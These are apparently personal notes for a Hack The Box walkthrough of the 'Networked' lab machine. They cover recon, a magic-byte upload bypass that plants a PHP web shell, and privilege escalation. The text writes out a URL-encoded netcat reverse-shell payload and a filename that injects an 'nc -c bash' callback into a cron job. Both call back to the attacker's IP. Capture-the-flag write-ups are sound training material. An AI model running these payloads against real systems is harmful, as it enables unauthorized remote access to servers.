<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>networked</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#networked">networked</a></p>
<ol>
<li><a href="#nmapAutomator.sh">nmapAutomator.sh</a></li>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#nmap vulns">nmap vulns</a></li>
</ol>
<li><a href="#recon">recon</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
<ol>
<li><a href="#index.php">index.php</a></li>
<li><a href="#/photos.php">/photos.php</a></li>
<li><a href="#lib.php">lib.php</a></li>
<li><a href="#/upload.php">/upload.php</a></li>
<li><a href="#/uploads">/uploads</a></li>
<li><a href="#/backup">/backup</a></li>
<ol>
<li><a href="#extract backup.tar">extract backup.tar</a></li>
</ol>
</ol>
<li><a href="#nikto">nikto</a></li>
</ol>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#upload.php backup">upload.php backup</a></li>
<li><a href="#magic bytes for png">magic bytes for png</a></li>
<li><a href="#upload cmd.php">upload cmd.php</a></li>
<li><a href="#cmd.php RCE">cmd.php RCE</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#privesc to guly">privesc to guly</a></li>
<ol>
<li><a href="#check_attack.php">check_attack.php</a></li>
<ol>
<li><a href="#exfiltrate file with base64 encode">exfiltrate file with base64 encode</a></li>
<li><a href="#lib.php changes?">lib.php changes?</a></li>
<li><a href="#scandir">scandir</a></li>
<li><a href="#touch -- '; nc -c bash 10.10.14.62 1234.php'">touch -- '; nc -c bash 10.10.14.62 1234.php'</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
</ol>
<li><a href="#priv esc to root">priv esc to root</a></li>
<ol>
<li><a href="#changename.sh">changename.sh</a></li>
<ol>
<li><a href="#vuln">vuln</a></li>
<li><a href="#POC">POC</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="networked"><h1><b><u>networked</u></b></h1><img alt="images/1229-1.png" src="images/1229-1.png"/><br/><img alt="images/1229-2.png" src="images/1229-2.png"/></div>
<div class="page" id="nmapAutomator.sh"><h1><b><u>nmapAutomator.sh</u></b></h1><span style="color:#ffa500;">nmap<br/><br/>recon<br/></span></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/1231-1.png" src="images/1231-1.png"/><br/><br/><img alt="images/1231-2.png" src="images/1231-2.png"/><br/><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> running on port 22 <br/></span><span style="color:#ffa500;">http</span><span style="color:#24ff00;"> running on port 80</span><br/><br/><br/><img alt="images/1231-3.png" src="images/1231-3.png"/></div>
<div class="page" id="nmap vulns"><h1><b><u>nmap vulns</u></b></h1><img alt="images/1233-1.png" src="images/1233-1.png"/><br/><br/><br/><img alt="images/1233-2.png" src="images/1233-2.png"/><br/><br/><br/><img alt="images/1233-3.png" src="images/1233-3.png"/><br/><br/><img alt="images/1233-4.png" src="images/1233-4.png"/><br/><br/><img alt="images/1233-5.png" src="images/1233-5.png"/><br/><br/><br/><br/><br/></div>
<div class="page" id="recon"><h1><b><u>recon</u></b></h1><span style="color:#ffa500;">gobuster <br/>nikto</span><br/><br/><img alt="images/1232-1.png" src="images/1232-1.png"/><br/><br/><img alt="images/1232-2.png" src="images/1232-2.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/1234-1.png" src="images/1234-1.png"/><br/><strong><span style="color:#24ff00;">status 200</span></strong><br/><span style="color:#ffa500;">/photos.php<br/>/index.php<br/>/lib.php<br/>/uploads.php<br/><br/></span><strong><span style="color:#24ff00;">status</span></strong><span style="color:#24ff00;"> </span><strong><span style="color:#24ff00;">301</span></strong><span style="color:#ffa500;"><br/>/uploads<br/>/backup</span><br/></div>
<div class="page" id="index.php"><h1><b><u>index.php</u></b></h1><img alt="images/1237-1.png" src="images/1237-1.png"/></div>
<div class="page" id="/photos.php"><h1><b><u>/photos.php</u></b></h1><img alt="images/1236-1.png" src="images/1236-1.png"/></div>
<div class="page" id="lib.php"><h1><b><u>lib.php</u></b></h1><span style="color:#ff0000;">blank<br/></span><img alt="images/1238-1.png" src="images/1238-1.png"/>s</div>
<div class="page" id="/upload.php"><h1><b><u>/upload.php</u></b></h1><span style="color:#24ff00;">very interesting find, we may be able to upload a reverse shell here</span><br/><br/><img alt="images/1239-1.png" src="images/1239-1.png"/></div>
<div class="page" id="/uploads"><h1><b><u>/uploads</u></b></h1><span style="color:#ff0000;">blank<br/><br/></span><img alt="images/1240-1.png" src="images/1240-1.png"/></div>
<div class="page" id="/backup"><h1><b><u>/backup</u></b></h1><span style="color:#24ff00;">compressed backup file</span><br/><span style="color:#24ff00;">lets download it </span><br/><br/><img alt="images/1243-1.png" src="images/1243-1.png"/></div>
<div class="page" id="extract backup.tar"><h1><b><u>extract backup.tar</u></b></h1><span style="color:#24ff00;">Quick </span><span style="color:#ffa500;">tar</span><span style="color:#24ff00;"> extraction tool usage for those unfamiliar:</span><br/><img alt="images/518-1.png" src="images/518-1.png"/><br/><br/><img alt="images/518-2.png" src="images/518-2.png"/></div>
<div class="page" id="nikto"><h1><b><u>nikto</u></b></h1><img alt="images/1235-1.png" src="images/1235-1.png"/><br/><img alt="images/1235-2.png" src="images/1235-2.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">first lets move our php reverse shell into our pwd<br/><br/>we can either upload a malicious php file to give us RCE or upload a php script that will call a shell back to us, either will work <br/><br/></span><img alt="images/1242-1.png" src="images/1242-1.png"/><br/><img alt="images/1242-2.png" src="images/1242-2.png"/><br/><br/><br/><img alt="images/1242-3.png" src="images/1242-3.png"/><br/><img alt="images/1242-4.png" src="images/1242-4.png"/><br/><br/></div>
<div class="page" id="upload.php backup"><h1><b><u>upload.php backup</u></b></h1><span style="color:#24ff00;">sifting through the 4 files extracted from the compressed backup file, </span><span style="color:#ffa500;">upload.php</span><span style="color:#24ff00;"> is worth checking for potential vulnerabilities:</span><br/><img alt="images/517-1.png" src="images/517-1.png"/><br/><br/><img alt="images/517-2.png" src="images/517-2.png"/><br/><img alt="images/517-3.png" src="images/517-3.png"/><br/><br/><span style="color:#24ff00;">breaking this code down, upload.php is vulnerable to a </span><span style="color:#ffff00;">magic byte</span><span style="color:#24ff00;"> spoof </span><br/><span style="color:#24ff00;">this is because upload.php checks the validity of its uploads based off 2 parameters</span><br/>1. <span style="color:#24ff00;">Whether the file ends in a proper picture file suffix</span><img alt="images/517-4.png" src="images/517-4.png"/><img alt="images/517-5.png" src="images/517-5.png"/><br/>2. <span style="color:#24ff00;">and whether or not a simple file command on the upload deems its a picture</span><img alt="images/517-6.png" src="images/517-6.png"/><br/><br/><span style="color:#24ff00;">If the upload passes both these checks, it is given execute permissions </span><img alt="images/517-7.png" src="images/517-7.png"/><br/></div>
<div class="page" id="magic bytes for png"><h1><b><u>magic bytes for png</u></b></h1><span style="color:#24ff00;">since we know png's are an accepted filetype to upload, lets upload a png file and upload it to the server and intercept the packet with burp suite<br/><br/></span><img alt="images/1245-1.png" src="images/1245-1.png"/><br/><img alt="images/1245-2.png" src="images/1245-2.png"/><br/><br/>upload to <span style="color:#ffa500;">/upload.php</span><span style="color:#24ff00;"> <br/></span><img alt="images/1245-3.png" src="images/1245-3.png"/><br/><br/><br/>now lets upload our php script, intercept the packet with burp suite, and paste a line or two of those png magic bytes<br/><img alt="images/1245-4.png" src="images/1245-4.png"/></div>
<div class="page" id="upload cmd.php"><h1><b><u>upload cmd.php</u></b></h1><span style="color:#24ff00;">first choose the file<br/></span><img alt="images/1246-1.png" src="images/1246-1.png"/><br/><br/>second intercept it<br/><img alt="images/1246-2.png" src="images/1246-2.png"/><br/><br/>send to repeater and rename <span style="color:#ffa500;">cmd.php </span><span style="color:#24ff00;">to </span><span style="color:#ffa500;">cmd.php.png</span><span style="color:#24ff00;"> and add the png magic bytes “</span><span style="color:#ffa500;">GIF8</span><span style="color:#24ff00;">” above our php script<br/></span><img alt="images/1246-3.png" src="images/1246-3.png"/><br/><br/>and we see it's uploaded<br/><img alt="images/1246-4.png" src="images/1246-4.png"/><br/><br/></div>
<div class="page" id="cmd.php RCE"><h1><b><u>cmd.php RCE</u></b></h1><span style="color:#24ff00;">lets navigate to the URL we just uploaded<br/><br/>if we visit</span><span style="color:#ffa500;"> /photos</span><span style="color:#24ff00;"> we can see the files we've uploaded</span><br/><img alt="images/1247-1.png" src="images/1247-1.png"/><br/><br/><span style="color:#24ff00;">right clicking our </span><span style="color:#ffa500;">php.gif</span><span style="color:#24ff00;"> will allow us to implement RCE</span><br/><br/><span style="color:#ffa500;">http://10.10.10.146/uploads/10_10_14_62.php.jpeg?miao=whoami</span><br/><img alt="images/1247-2.png" src="images/1247-2.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">here Ill grab the netcatt OpenBSD reverse shell from </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">payloadallthethings</a><br/><img alt="images/1248-1.png" src="images/1248-1.png"/><br/><br/><span style="color:#24ff00;">and url encode it with Burp</span><br/><img alt="images/1248-2.png" src="images/1248-2.png"/><br/><span style="color:#24ff00;">set this value =miao and set up a listener on port 4242</span><br/><br/><br/><span style="color:#ffa500;">http://10.10.10.146/uploads/10_10_14_62.php.jpeg?miao=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%36%32%20%34%32%34%32%20%3e%2f%74%6d%70%2f%66</span><br/><img alt="images/1248-3.png" src="images/1248-3.png"/><br/><span style="color:#24ff00;">and we have our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">!</span><br/><br/><br/></div>
<div class="page" id="privesc to guly"><h1><b><u>privesc to guly</u></b></h1><span style="color:#24ff00;">with user apache's privileges we can get into guly's directory but we cannot get the user.txt flag yet, but we see some interesting files</span><br/><br/><img alt="images/1249-1.png" src="images/1249-1.png"/><br/><br/><img alt="images/1249-2.png" src="images/1249-2.png"/></div>
<div class="page" id="check_attack.php"><h1><b><u>check_attack.php</u></b></h1><img alt="images/1250-1.png" src="images/1250-1.png"/><br/><img alt="images/1250-2.png" src="images/1250-2.png"/></div>
<div class="page" id="exfiltrate file with base64 encode"><h1><b><u>exfiltrate file with base64 encode</u></b></h1><span style="color:#24ff00;">encode the file with </span><span style="color:#ffa500;">base64 &lt;filename&gt;</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1251-1.png" src="images/1251-1.png"/><br/><br/>copy the string with <span style="color:#ffa500;">echo -n “&lt;string&gt;”</span><br/><span style="color:#ffa500;">| </span><span style="color:#24ff00;">pipe it to </span><span style="color:#ffa500;">base64 -d</span><span style="color:#24ff00;"> to decode it<br/>and output it to file </span><span style="color:#ffa500;">&gt; check_attack.php</span><br/><img alt="images/1251-2.png" src="images/1251-2.png"/><br/><br/>now we get a prettier program to work with<br/><img alt="images/1251-3.png" src="images/1251-3.png"/><br/><img alt="images/1251-4.png" src="images/1251-4.png"/><br/><br/></div>
<div class="page" id="lib.php changes?"><h1><b><u>lib.php changes?</u></b></h1><span style="color:#24ff00;">we see that the script requires </span><img alt="images/1252-1.png" src="images/1252-1.png"/> so lets see if we can change that<br/><br/><img alt="images/1252-2.png" src="images/1252-2.png"/><br/>unfortunately we <span style="color:#ff0000;">dont</span><span style="color:#24ff00;"> have write permissions<br/><br/></span></div>
<div class="page" id="scandir"><h1><b><u>scandir</u></b></h1><img alt="images/1254-1.png" src="images/1254-1.png"/><span style="color:#24ff00;"><br/>lets see exactly what </span><span style="color:#ffa500;">scandir</span><span style="color:#24ff00;"> does using our own environment<br/><br/></span><img alt="images/1254-2.png" src="images/1254-2.png"/><br/><br/>we see it scans the directory its in!<br/><img alt="images/1254-3.png" src="images/1254-3.png"/><br/><br/>now looking at <span style="color:#ffa500;">check_attack.php</span><br/><img alt="images/1254-4.png" src="images/1254-4.png"/><br/><br/>we see we have control of the <span style="color:#ffa500;">$value</span><span style="color:#24ff00;"> parameter since we can upload files to our victim, we just need to name the file something malicious and it will get executed by php </span><span style="color:#ffa500;">exec</span><span style="color:#24ff00;"> without any sanitation!<br/><br/>exec can run multiple commands on one line if separated by a semi-colon so lets use that to our advantage here and get a little creative<br/><br/></span><img alt="images/1254-5.png" src="images/1254-5.png"/><br/>if we separate <span style="color:#ffa500;">$path </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">$value</span><span style="color:#24ff00;"> with a semicolon ‘;’ we can write malicious code after it<br/><br/><br/><br/></span></div>
<div class="page" id="touch -- '; nc -c bash 10.10.14.62 1234.php'"><h1><b><u>touch -- '; nc -c bash 10.10.14.62 1234.php'</u></b></h1><span style="color:#24ff00;">lets add a file into the directory that begins with a semicolon to kill the </span><span style="color:#ffa500;">check_attack script</span><span style="color:#24ff00;"> and run a reverse shell<br/><br/></span><span style="color:#ffa500;">touch -- '; nc -c bash 10.10.14.62 1234.php'</span><span style="color:#24ff00;"><br/>where</span><span style="color:#ffa500;"> --' </span><span style="color:#24ff00;">escapes the initial exec call<br/>and </span><span style="color:#ffa500;">nc -c bash 10.10.14.62 1234</span><span style="color:#24ff00;">.php is our reverse shell call<br/><br/>(we want to label the file </span><span style="color:#ffa500;">.php </span><span style="color:#24ff00;">so </span><span style="color:#ffa500;">check_attack</span><span style="color:#24ff00;"> will think we're attacking it and run the </span><span style="color:#ffa500;">exec</span><span style="color:#24ff00;"> function</span><br/><img alt="images/1253-1.png" src="images/1253-1.png"/><br/><br/><span style="color:#24ff00;">this is what the directory should look like</span><br/><img alt="images/1253-2.png" src="images/1253-2.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">check_attack runs every </span><span style="color:#ffff00;">3 minutes</span><span style="color:#24ff00;"> since its a scheduled task <br/></span><img alt="images/1255-1.png" src="images/1255-1.png"/><br/><br/>so its only a matter of time <br/><img alt="images/1255-2.png" src="images/1255-2.png"/><br/><br/></div>
<div class="page" id="priv esc to root"><h1><b><u>priv esc to root</u></b></h1><span style="color:#24ff00;">running </span><span style="color:#ffa500;">sudo -l</span><br/><br/><img alt="images/1257-1.png" src="images/1257-1.png"/><br/><img alt="images/1257-2.png" src="images/1257-2.png"/><br/><br/></div>
<div class="page" id="changename.sh"><h1><b><u>changename.sh</u></b></h1><img alt="images/1258-1.png" src="images/1258-1.png"/><br/><br/><img alt="images/1258-2.png" src="images/1258-2.png"/></div>
<div class="page" id="vuln"><h1><b><u>vuln</u></b></h1><span style="color:#24ff00;">first we must note our regular expressions allowed in this program<br/></span><img alt="images/1260-1.png" src="images/1260-1.png"/><br/>we see \ / allows us to use a <span style="color:#ffa500;">space</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1260-2.png" src="images/1260-2.png"/><br/><br/>this code reads in our input and reads it back out as <span style="color:#ffa500;">x</span><span style="color:#24ff00;"><br/><br/>now if we declare a variable in bash and run a command right after it we see:<br/></span><img alt="images/1260-3.png" src="images/1260-3.png"/><br/><br/>our command will run after our variable declaration<br/><br/><br/></div>
<div class="page" id="POC"><h1><b><u>POC</u></b></h1><span style="color:#24ff00;">if we enter a space and run bash in any of the</span> <span style="color:#ffa500;">changename.sh</span><span style="color:#24ff00;"> inputs it will exectute as root</span><br/><br/><img alt="images/1259-1.png" src="images/1259-1.png"/><br/><br/><span style="color:#24ff00;">and we see we are </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1256-1.png" src="images/1256-1.png"/><br/><span style="color:#ffff00;">526cfc2305f17faaacecf212c57d71c5<br/><br/></span><img alt="images/1256-2.png" src="images/1256-2.png"/><br/>0a8ecda83f1d81251099e8ac3d0dcb82</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1980-1.png" src="images/1980-1.png"/></div>
</div></body></html>